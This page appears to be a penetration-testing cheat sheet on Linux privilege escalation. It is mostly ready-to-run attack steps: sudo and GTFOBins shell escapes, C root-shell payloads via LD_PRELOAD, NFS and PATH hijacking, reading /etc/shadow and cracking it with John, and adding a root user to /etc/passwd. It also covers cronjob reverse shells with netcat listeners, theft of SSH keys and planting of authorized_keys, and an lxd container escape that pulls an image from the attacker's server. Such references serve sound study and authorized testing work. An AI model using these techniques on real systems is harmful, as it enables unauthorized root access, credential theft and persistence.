---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Linux Privilege Escalation

Here are some techniques for achieving privilege escalation on _Linux_ systems:

## <mark style="color:orange;">Abusing Sudo execution permissions</mark>

* Verify which commands can be run with sudo

{% code overflow="wrap" lineNumbers="true" %}
```bash
$ sudo -l

#Example results
User user may run the following commands on the host:
    (ALL) NOPASSWD: /usr/bin/find
```
{% endcode %}

{% hint style="info" %}
the `find` command is used as an example, can be any other command
{% endhint %}

***

* Check _Sudo_ abuse for the binary on [_GTFOBins_](../tools-and-utilities.md#gtfobins) and use it on the target machine to get privileges

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo find . -exec /bin/sh \; -quit
#This will return a root shell
```
{% endcode %}

## <mark style="color:orange;">Abusing LD\_PRELOAD</mark>

* Verify the _LD\_PRELOAD_ option in _env\_keep_

{% code overflow="wrap" lineNumbers="true" %}
```bash
$ sudo -l
#Example results
Matching Defaults entries for user on ip-0-0-0-0:
    env_reset, env_keep+=LD_PRELOAD
```
{% endcode %}

* Write a simple script in C

{% code title="shell.c " overflow="wrap" lineNumbers="true" %}
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
{% endcode %}

***

* Then compile into a shared library

{% code overflow="wrap" lineNumbers="true" %}
```bash
gcc shell.c -fPIC -shared -o shell.so -nostartfiles
```
{% endcode %}

{% hint style="info" %}
The extension _.so_ represents a shared object
{% endhint %}

***

* Run a sudo command specifying the _LD\_PRELOAD_ option with the script

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>sudo LD_PRELOAD=/home/user/ldpreload/shell.so $command
</strong><strong>#This will prompt a root shell
</strong></code></pre>

{% hint style="info" %}
The _$command_ in this case, is any command with sudo permissions found using `sudo -l`
{% endhint %}

## <mark style="color:orange;">Abusing SUID/SGID permissions on reading binaries</mark>

* Verify executables with special permissions

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>find / -type f -perm -04000 -ls 2>/dev/null | grep bin
</strong>#Example results
<strong>1111  1  -rwsr-xr-x  1  root  root  1111  Feb  10  2030  /usr/bin/base64
</strong></code></pre>

{% hint style="info" %}
`base64` is used as an example, can be any other executable with data visualization properties such as `nano`,`cat`, `vim`, `nvim`, etc...
{% endhint %}

***

* Check binary SUID abuse on [_GTFOBins_](../tools-and-utilities.md#gtfobins)

{% code overflow="wrap" lineNumbers="true" %}
```bash
LFILE=file_to_read
base64 "$LFILE" | base64 --decode
```
{% endcode %}

***

* Abuse privileges to read important files and copy its content locally

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>base64 /etc/shadow | base64 --decode #Display content of shadow    
</strong>base64 /etc/passwd | base64 --decode #Display content of passwd
touch shadow.txt #Create on the host machine and copy the content of shadow
touch passwd.txt #Create on the host machine and copy the content of passwd
</code></pre>

***

* Use _John_ to make a crackable file and crack passwords

{% code overflow="wrap" lineNumbers="true" %}
```sh
unshadow passwd.txt shadow.txt > crack.txt
john -w=/usr/share/wordlists/rockyou.txt crack.txt
#If possible to crack this will display the password of users
```
{% endcode %}

## <mark style="color:orange;">Abusing SUID/SGID permissions on writing binaries</mark>

* Verify executables with special permissions

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>find / -type f -perm -04000 -ls 2>/dev/null | grep bin
</strong>#Example results
<strong>1111  1  -rwsr-xr-x  1  root  root  1111  Feb  10  2030  /usr/bin/nano
</strong></code></pre>

{% hint style="info" %}
`nano` is used as an example, can be any other executable with the same reading properties such as `vim`, `nvim`, etc...
{% endhint %}

***

* Abuse privileges to create users with privileges

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>openssl passwd -1 -salt AAA $password    #Create user hash
</strong><strong>nano /etc/passwd
</strong><strong>$username:$hash:0:0:root:/root:/bin/bash #Add this at the final of /etc/passwd
</strong>su $username                             #Switch to the new user
</code></pre>

{% hint style="info" %}
_$username_ is an arbitrary name and the _/root:/bin/bash_ specify we are requesting a root shell
{% endhint %}

## <mark style="color:orange;">Abusing capabilities on binaries</mark>

* Verify executables with set capabilities

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>getcap -r / 2>/dev/null
</strong>#Example results
/home/karen/vim = cap_setuid+ep
</code></pre>

{% hint style="info" %}
`vim` is used as an example, can be any other executable
{% endhint %}

***

* Check binary capabilities abuse on [_GTFOBins_](../tools-and-utilities.md#gtfobins)

{% code overflow="wrap" lineNumbers="true" %}
```bash
./vim -c ':py import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'  #For python3
```
{% endcode %}

***

* Go to the binary location and execute the payload

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>cd /home/karen/vim
</strong>./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
#This will give you a root shell
</code></pre>

## <mark style="color:orange;">Abusing existing cronjobs</mark>

* Verify executables set as cronjobs

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>cat /etc/crontab
</strong>#Example results
* * * * * root /home/user/file.sh
</code></pre>

{% hint style="info" %}
_file.sh_ is an arbitrary name used as an example. Can be another bash file or executable.
{% endhint %}

***

* Go to the file location and change the content to get a reverse shell

{% code overflow="wrap" lineNumbers="true" %}
```bash
cd /home/user
nano file.sh    # The content will be replaced with a reverse shell script
```
{% endcode %}

{% hint style="info" %}
To see the script of the reverse shell you can go[ here](../../../../scripting/reverse-shell.md)
{% endhint %}

***

* Create a listening port with netcat to receive the shell

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>nc -nlvp $port
</strong>#You will receive a root shell
</code></pre>

{% hint style="info" %}
_$port_ is the port specified in the reverse shell script
{% endhint %}

## <mark style="color:orange;">Abusing deleted cronjobs</mark>

* Verify executables set as cronjobs

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>cat /etc/crontab
</strong>#Example results
PATH:/home/user:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
...
* * * * * root file.sh
</code></pre>

{% hint style="info" %}
* _file.sh_ is an arbitrary name used as an example. Can be another bash file or executable.
* We have to keep in mind the path of the _/etc/crontab_ file
{% endhint %}

***

* Verify if the executable was deleted and create one with the same name

{% code overflow="wrap" lineNumbers="true" %}
```bash
locate file.sh    #This will show nothing which means that was deleted
cd /home/user
nano file.sh    # The content will be a reverse shell script
```
{% endcode %}

{% hint style="info" %}
Note that the folder we navigate to is the one that was listed in _/etc/crontab_
{% endhint %}

***

* Create a listening port with netcat to receive the shell

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>nc -nlvp $port
</strong>#You will receive a root shell
</code></pre>

{% hint style="info" %}
_$port_ is the port specified in the reverse shell script
{% endhint %}

## <mark style="color:orange;">Abusing PATH environment variable</mark>

* Search for any writable folder and compare it to _PATH_

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash">find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
#Example results
<strong>etc/udev  home/user  run/dbus  snap/core  sys/fs  tmp  usr/lib  var/crash
</strong>
echo $PATH
#Example results
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
</code></pre>

{% hint style="info" %}
* We note there is a home folder where we can write
* In case we haven't found anything, we have to write to _/tmp_
{% endhint %}

***

* Add folder to _PATH_ and go to this location

{% code overflow="wrap" lineNumbers="true" %}
```bash
export PATH=/home/user:$PATH
echo $PATH   #To check it was added
cd /home/user
```
{% endcode %}

***

* Write a simple script in _C_ to search for an executable

{% code title="path.c " overflow="wrap" lineNumbers="true" %}
```c
#include <unistd.h>

void main() {
    setgid(0);
    setuid(0);
    system("root");
}
```
{% endcode %}

{% hint style="info" %}
The system will search for an executable named _root,_ which is an arbitrary name
{% endhint %}

***

* Compile the script and give it SUID permissions

{% code overflow="wrap" lineNumbers="true" %}
```bash
gcc path.c -o path -w
chmod u+s path
ls -l     #To check if it has a permission on user
```
{% endcode %}

***

* Create a file to ask for a shell and give it permissions

{% code overflow="wrap" lineNumbers="true" %}
```bash
echo "/bin/bash" > root #Asking for a shell
chmod 777 root
ls -l    #To check it has all permissions
```
{% endcode %}

{% hint style="info" %}
Note that is the same executable we called previously on the _C_ script
{% endhint %}

***

* Run path script to get privileges

{% code overflow="wrap" lineNumbers="true" %}
```bash
./path
#This will return a root shell
```
{% endcode %}

## <mark style="color:orange;">Abusing NFS misconfiguration</mark>

* Check NFS configuration, and search for the _no\_root\_squash_ value

{% code overflow="wrap" lineNumbers="true" %}
```bash
cat /etc/exports
#Example results
/home/ubuntu/sharedfolder *(rw,sync,insecure,no_root_squash,no_subtree_check)
```
{% endcode %}

***

* On the host machine check for mountable shares

{% code overflow="wrap" lineNumbers="true" %}
```bash
showmount -e $targetIP
#Example results
/home/ubuntu/sharedfolder *
/tmp                      *
/home/backup              *
```
{% endcode %}

***

* On the host machine, create a shared folder with the target

{% code overflow="wrap" lineNumbers="true" %}
```bash
mkdir /tmp/Attack
sudo mount -o rw $targetIP:/home/ubuntu/sharedfolder /tmp/Attack
```
{% endcode %}

***

* Write a simple script in _C_ to ask for a shell

{% code title="nfs.c " overflow="wrap" lineNumbers="true" %}
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(void) {
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
    return 0;
}
```
{% endcode %}

***

* Compile the script and give it SUID Permissions

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>cd /tmp/Attack
</strong><strong>nano nfs.c    #Create the script as above
</strong>sudo gcc nfs.c -o nfs -w
<strong>sudo chmod u+s nfs
</strong>ls -l     #To check if it has permissions on user
</code></pre>

***

* On the target machine run the script to get privileges

{% code overflow="wrap" lineNumbers="true" %}
```bash
./nfs
#This will return a root shell
```
{% endcode %}

## <mark style="color:orange;">Abusing SSH keys</mark>

* Check if we have reading permissions on the SSH private keys of a user

{% code overflow="wrap" lineNumbers="true" %}
```bash
cat /home/$user/.ssh/$keyfile    #For a user
cat /root/.ssh/$keyfile          #For root user
```
{% endcode %}

{% hint style="info" %}
Standard key files are called _id\_rsa_
{% endhint %}

***

* Copy the keys to a file, assign permissions to the file, and use it to log in using the key

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash"><strong>nano $filename #Copy here the keys
</strong><strong>chmod 600 $filename
</strong>ssh $username@$IP -i $filename
</code></pre>

{% hint style="info" %}
Use `chmod 600 id_rsa` to assign restrictive permissions and the SSH does not block this method
{% endhint %}

***

* When having writing permissions on the _/root/.ssh/_ directory, we can generate an SSH key with the current user and pass it to the system

{% code overflow="wrap" lineNumbers="true" %}
```bash
ssh-keygen -f $keyfile
```
{% endcode %}

{% hint style="info" %}
This will generate the file with a private key for the user and a `.pub` file with a public key
{% endhint %}

***

* Pass the public key to the authorized keys file of the _root_ user

{% code overflow="wrap" lineNumbers="true" %}
```bash
cat $keyfilename.pub >> /root/.ssh/authorized_keys
```
{% endcode %}

***

* Use this to log in as _root_ using the key

{% code overflow="wrap" lineNumbers="true" %}
```bash
ssh root@$IP -i $keyfile 
```
{% endcode %}

## <mark style="color:orange;">Abusing lxd</mark>

* Verify _lxd_ is installed on the system

{% code overflow="wrap" lineNumbers="true" %}
```bash
lxd --version
```
{% endcode %}

***

* Add the current user to the _lxd_ group (in case it isn't there yet)

{% code overflow="wrap" lineNumbers="true" %}
```bash
usermod --append --groups lxd $user
```
{% endcode %}

***

* On our machine, install the required _lxd_ components

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo apt install lxd
sudo apt install zfsutils-linux
```
{% endcode %}

***

* Activate the _lxd_ service and start it

{% code overflow="wrap" lineNumbers="true" %}
```bash
sudo systemctl start lxd.service
sudo lxd init
```
{% endcode %}

***

* Download an image or build it if necessary

{% code overflow="wrap" lineNumbers="true" %}
```bash
wget https://github.com/saghul/lxd-alpine-builder/alpine-v3.13-x86_64-20210218_0139.tar.gz # Pre-built image
```
{% endcode %}

{% hint style="info" %}
We use an image for _Alpine_, but any other light-weight distro can be built and used
{% endhint %}

***

* Mount a server to import and download the image to the target host

{% code overflow="wrap" lineNumbers="true" %}
```bash
# On our machine
python3 -m http.server $port

#On the target machine
wget http://$IP:$port/$filename.tar.gz
```
{% endcode %}

***

* On the target, import the image and use it to create a container specifying high privileges and mounting the complete filesystem

{% code overflow="wrap" lineNumbers="true" %}
```bash
lxc image import $imageroute --alias $imagename
lxc init $imagename $containername -c security.privileged=true
lxc config device add $containername host-root disk source=/ path /mnt recursive=true
```
{% endcode %}

***

* Start the container, ask for a shell from it, and access the mount point of the filesystem

<pre class="language-bash" data-overflow="wrap" data-line-numbers><code class="lang-bash">lxc start $containername
<strong>lxc exec pwned /bin/sh
</strong>cd /mount
</code></pre>

{% hint style="info" %}
The shell will be generated as the _root_ user having complete permissions on the filesystem
{% endhint %}
